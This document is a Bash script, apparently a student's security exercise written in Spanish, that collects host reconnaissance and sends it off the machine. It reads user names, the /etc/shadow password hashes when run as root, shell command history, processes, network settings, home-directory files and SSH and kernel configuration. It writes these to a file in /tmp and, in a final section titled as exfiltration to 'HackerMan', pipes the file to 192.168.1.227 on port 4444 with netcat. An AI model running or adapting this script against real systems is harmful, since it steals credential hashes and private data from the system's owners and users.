#!/bin/bash

# Alumno: Tenoch Itzin Flores Rojas
# Ruta del archivo de salida
archivo_salida="/tmp/Informacion.txt"

# Abre el archivo para escribir o crea uno nuevo si no existe
exec > "$archivo_salida" 2>&1  # Redirige también los errores al archivo

#================================== Información del Sistema ==========================================
echo "============================================================================="
echo "========================= Información del Sistema ==========================="
echo "============================================================================="

# Información del sistema operativo y kernel
echo "Versión del Kernel:"
uname -r
echo "Arquitectura del sistema:"
uname -m
echo "Sistema operativo y versión:"
cat /etc/os-release

#================================== Usuarios ==========================================
echo "============================================================================="
echo "========================= Nombres de usuario ================================"
echo "============================================================================="

# Ruta del archivo /etc/passwd
archivo_passwd="/etc/passwd"

# Verificar si el archivo existe
if [ -f "$archivo_passwd" ]; then
    usuarios=$(awk -F':' '{print $1}' "$archivo_passwd")
    echo "Usuarios del sistema:"
    echo "$usuarios"
else
    echo "El archivo $archivo_passwd no existe."
fi

#================================== Hash de Contraseñas ==========================================

echo "============================================================================="
echo "========================= Hash de las Contraseñas (requiere sudo) ============"
echo "============================================================================="

# Verificar si el usuario tiene permisos para acceder a /etc/shadow
if [ "$(id -u)" -eq 0 ]; then
    if [ -f "/etc/shadow" ]; then
        cat /etc/shadow
    else
        echo "El archivo /etc/shadow no existe."
    fi
else
    echo "No tienes permisos para acceder a /etc/shadow. Se requieren privilegios de superusuario."
fi

#================================== Historial de Comandos ==========================================
echo "============================================================================="
echo "======================= Historial de comandos ==============================="
echo "============================================================================="

# Verificar si el archivo de historial existe (zsh o bash)
historial_bash="/home/user/.bash_history"
historial_zsh="/home/user/.zsh_history"

if [ -f "$historial_bash" ]; then
    cat "$historial_bash"
elif [ -f "$historial_zsh" ]; then
    cat "$historial_zsh"
else
    echo "No se encontró el archivo de historial de comandos."
fi

#================================== Procesos Activos ==========================================
echo "============================================================================="
echo "======================= Procesos en ejecución ==============================="
echo "============================================================================="
ps aux 

#================================== Configuración de Redes ==========================================
echo "============================================================================="
echo "=========================== Interfaces de red ==============================="
echo "============================================================================="
ip a

#================================== Archivos en el directorio /home ==========================================
echo "============================================================================="
echo "========================= Archivos en el Directorio Home ===================="
echo "============================================================================="
find /home -type f -exec ls -lh {} \; | awk '{ print $9 ": " $5 }'

#================================== Configuración del SSH y Kernel ==========================================
echo "============================================================================="
echo "===================== Archivos de config importantes ========================"
echo "============================================================================="

echo "====================== Configuración del servidor SSH ======================="
archivo_config="/etc/ssh/sshd_config"

if [ -f "$archivo_config" ]; then
    cat "$archivo_config"
else
    echo "El archivo $archivo_config no existe."
fi

echo "=================== Información de los grupos del sistema ==================="
group="/etc/group" 

if [ -f "$group" ]; then
    cat "$group"
else
    echo "El archivo $group no existe."
fi

echo "========================= Configuración del Kernel ==========================="
kernel="/etc/sysctl.conf"

if [ -f "$kernel" ]; then
    cat "$kernel"
else
    echo "El archivo $kernel no existe."
fi

#================================== Archivos Asociados a Procesos ==========================================
echo "============================================================================="
echo "===================== Archivos asociados a los procesos ====================="
echo "============================================================================="

echo "¿Quieres incluir también los archivos asociados a los procesos? (y/n)"
read respuesta

if [ "$respuesta" == "y" ]; then
    sudo lsof &>/dev/null

    if [ "$?" -eq 0 ]; then
        sudo lsof >> "$archivo_salida" 2>/dev/null
    else
        echo "Se requieren privilegios de superusuario para esta función."
        exit 1
    fi
elif [ "$respuesta" == "n" ]; then
    echo "Opción seleccionada: No."
else
    echo "Respuesta no válida. Se esperaba 'y' o 'n'."
fi

# Cierra la redirección al archivo
exec > /dev/tty

#================================== Exfiltración de Datos ==========================================
echo "============================================================================="
echo "===================== Exfiltrando datos a HackerMan ====================="
echo "============================================================================="

# Exfiltrar la información automáticamente
nc 192.168.1.227 4444 < "$archivo_salida"

echo "============================================================================="
echo "========================= Salida en $archivo_salida ========================="
echo "============================================================================="

